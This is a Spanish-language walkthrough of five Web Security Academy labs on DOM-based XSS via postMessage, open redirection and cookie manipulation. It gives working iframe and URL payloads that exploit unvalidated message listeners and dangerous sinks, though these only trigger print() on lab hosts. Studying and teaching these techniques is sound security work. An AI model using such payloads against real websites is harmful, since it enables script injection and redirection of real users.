# DOM-based vulnerabilities

## Lab: DOM XSS using web messages

### Enunciado

Este laboratorio demuestra una vulnerabilidad sencilla de mensajes web. Usa el servidor de exploits para enviar un mensaje al sitio objetivo que provoque la ejecución de la función `print()`.

### Resolución

Vemos el código fuente y vemos una función **innerHTML** asigna directamente el contenido al elemento **div** con id **ads**.\
Si **e.data** contiene código HTML o JavaScript, **el navegador lo interpretará y ejecutará**.

Además, **observamos que la respuesta no incluye la cabecera `x-frame-options`:**

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto permite **incrustar el sitio en un iframe**.

{% embed url="https://developer.mozilla.org/es/docs/Web/API/Window/postMessage" %}

**Con esa base, podemos crear un HTML malicioso como este:**

```html
<iframe src="https://0a5e00ac04903464809e034d00d300ba.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=alert(XSS)>','*')">
</iframe>
```

Pero para **resolver el laboratorio**, usaremos el payload que dispara **print():**

```html
<iframe src="https://0a5e00ac04903464809e034d00d300ba.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS using web messages and a JavaScript URL

### Enunciado

Este laboratorio demuestra una vulnerabilidad de redirección basada en el DOM que se activa mediante web messaging. Crea una página HTML en el servidor de exploits que aproveche esta vulnerabilidad y que ejecute la función `print()`.

### Resolución

Vemos el código fuente.&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En este caso, **el procesamiento del web message es vulnerable a XSS basado en DOM**, porque **el event listener no valida correctamente el origen de los mensajes recibidos ni las propiedades y funciones que usa.**

Además, **identificamos un&#x20;**_**sink**_**&#x20;peligroso** `location.href`que permite redirigir a otra página. Sin embargo, **antes de hacer la redirección**, el código verifica que los datos del mensaje contengan **http:** o **https.**

**Con esta información, podemos preparar un HTML malicioso** que use un `<iframe>` y la función **postMessage()** para enviar datos al listener vulnerable en la página objetivo:

```html
<html>
  <body>
    <iframe src="https://0a2b0071046a9d6681aec51300f90043.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*');"></iframe>
  </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS using web messages and `JSON.parse`

### Enunciado

Este laboratorio utiliza web messaging y analiza el mensaje como JSON. Crea una página HTML en el servidor de exploits que aproveche esta vulnerabilidad y ejecute la función `print()`.

### Resolución

Vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En este caso, **hay un event listener que recibe mensajes web y los interpreta como datos JSON usando `JSON.parse`**. El problema es que **el listener no valida correctamente el origen del mensaje**, por lo que acepta cualquier entrada.

Dentro del código, hay un `switch` con un caso llamado **`load-channel`**, que **cambia el atributo `src` de un elemento `<iframe>`**. Esto convierte ese atributo en un **sink peligroso**.

Con esta información, podemos **crear un HTML malicioso con un `<iframe>`** y usar `postMessage()` para enviar un mensaje manipulado al listener vulnerable.\
El listener tomará el contenido y lo pasará al sink en la página principal:

```javascript
postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}", "*")
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Creamos el siguiente paylaod.

```
<html>
    <body>
        <iframe src="https://0ae200cd04519f0c824b014900eb0008.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*");'></iframe>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM-based open redirection

### Enunciado

Este laboratorio contiene una vulnerabilidad de redirección abierta basada en DOM (DOM-based open-redirection). Exploita esta vulnerabilidad y redirige a la víctima hacia el servidor de exploits.

### Resolución

Vemos el código fuente de los post.

<figure><img src="../../.gitbook/assets/image (1505).png" alt=""><figcaption></figcaption></figure>

Verifica si el objeto **location** contiene **url=**[**http://loquesea.com**](http://loquesea.com) o **url=**[**https://loquesea.com**](https://loquesea.com). Si encuentra ese parámetro, **asigna el valor a `location.href`** para redirigir a esa dirección.

<figure><img src="../../.gitbook/assets/image (1506).png" alt=""><figcaption></figcaption></figure>

Es **vulnerable a redirección abierta basada en DOM**.

Para **explotarla**, podemos **añadir el payload como parámetro GET**:

```
/post?postId=9&url=https://exploit-0a6200ff03db6e4e8148c45501ce0070.exploit-server.net/
```

Así, **forzamos la redirección** a nuestro servidor de exploits.

<figure><img src="../../.gitbook/assets/image (1508).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1507).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM-based cookie manipulation

### Enunciado

Este laboratorio demuestra una manipulación de cookies en el lado del cliente basada en DOM. Inyecta una cookie que provoque un ataque XSS en otra página y ejecute la función `print()`. Para ello, deberás usar el servidor de exploits para redirigir a la víctima a las páginas correctas.

### Resolución

Vemos el código fuente de los productos.

<figure><img src="../../.gitbook/assets/image (1509).png" alt=""><figcaption></figcaption></figure>

Aquí vemos que hay un **sink peligroso**: `document.cookie`. La **fuente** de datos (input controlado por el atacante) es **`window.location`**.

Esto significa que **se establecerá una nueva cookie** llamada `lastViewdProduct`, **usando como valor la propiedad `window.location`**.

Refrescamos la página.

<figure><img src="../../.gitbook/assets/image (1510).png" alt=""><figcaption></figcaption></figure>

Cuando actualizamos la página, **se genera dinámicamente un nuevo enlace `<a>`** con el atributo **href** igual a **`window.location`**.

Esto significa que **podemos inyectar código malicioso en la URL**.

```
/product?productId=1&payload='><img src=errorpls onerror="print()">
```

Al incluir este payload, **cerramos el atributo href y añadimos un elemento `<img>` con un evento `onerror` que ejecuta `print()`.**

<figure><img src="../../.gitbook/assets/image (1511).png" alt=""><figcaption></figcaption></figure>

Refrescamos la página.

<figure><img src="../../.gitbook/assets/image (1512).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto ya podemos crear el payload HTML.

```
<html>
    <body>
        <iframe src="https://0af7002804ccb93881db16ef001d00b0.web-security-academy.net/product?productId=1&payload=%27%3E%3Cimg%20src%3Derrorpls%20onerror%3D%22print%28%29%22%3E" onload="if(!window.triggerXSSPayload)this.src='https://0af7002804ccb93881db16ef001d00b0.web-security-academy.net';window.triggerXSSPayload=1;"></iframe>
    </body>
</html>
```

Este **payload** generará un **elemento `<iframe>`** apuntando a nuestra URL con el payload que establece la cookie. Cuando se cargue, **verificamos si se activó el XSS**.

Si **no se dispara**, entonces **cambiamos el atributo `src` del `<iframe>`** para que apunte a la **página principal del sitio vulnerable**.

De este modo, **forzamos a que se cargue la cookie inyectada y se ejecute el payload XSS.**

<figure><img src="../../.gitbook/assets/image (1513).png" alt=""><figcaption></figcaption></figure>
